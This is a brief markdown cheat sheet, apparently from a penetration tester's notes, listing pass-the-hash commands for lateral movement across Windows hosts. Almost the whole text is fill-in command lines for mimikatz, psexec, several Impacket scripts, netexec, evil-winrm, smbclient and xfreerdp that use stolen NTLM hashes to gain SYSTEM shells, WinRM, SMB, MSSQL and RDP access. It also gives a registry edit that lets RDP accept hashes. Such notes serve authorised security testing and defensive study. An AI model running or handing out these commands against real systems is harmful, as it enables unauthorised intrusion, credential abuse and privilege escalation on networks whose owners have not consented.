# Pass-the-Hash Lateral Movement 

## Tools: impacket , psexec , crackmapexec/netexec , evil-winrm , xfreerdp/remmina , smbclient , mimikatz

# Interactive shell

#### 1) mimikatz

 - mimikatz "privilege::debug sekurlsa::pth /user USER /domain:DOMAIN /ntlm:HASH

#### 2) psexec (Impacket and Windows)

 - psexec.exe -AcceptEULA \\IP

 - impacket-psexec -hashes":HASH" USER@IP

## TIP: Both of these techniques give NT Authority/System shell (System/Admin access)

# Pseudo-shell (File write and read) (System/Admin access)

#### 1) crackmapexec/netexec

 - netexec smb IP_RANGE -u USER -d DOMAIN -H ':HASH'

 - netexec smb IP_RANGE -u USER -H ':HASH' --local-auth

#### 2) Impacket Library

 - atexec.py -hashes ":HASH" USER@IP "COMMAND"

 - smbexec.py -hashes ":HASH" USER@IP

## These techniques give NT Authority/System shell

 - wmiexec.py -hashes ":HASH" USER@IP

 - dcomexec.py -hashes ":HASH" USER@IP

# WinRM 

#### 1) evil-winrm

 - evil-winrm -i IP -u USER -H HASH

# SMB

#### 1) smbclient

 - smbclient.py -hashes ":HASH" USER@IP (Authenticate, then search files)

# RDP

#### 1) reg.py and xfreerdp/remmina

 - reg.py DOMAIN/USER@IP -hashes ':HASH' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisabledRestrictedAdmin' -vt 'REG_DWORD' -vd '0'

 - xfreerdp /u:USER /d:DOMAIN /pth:HASH /v:IP

# MSSQL

#### 1) crackmapexec/netexec

 - netexec mssql IP_RANGE -H ':HASH'

#### 2) mssqlclient.py

 - mssqlclient.py -windows-auth -hashes ":HASH" DOMAIN/USER@IP
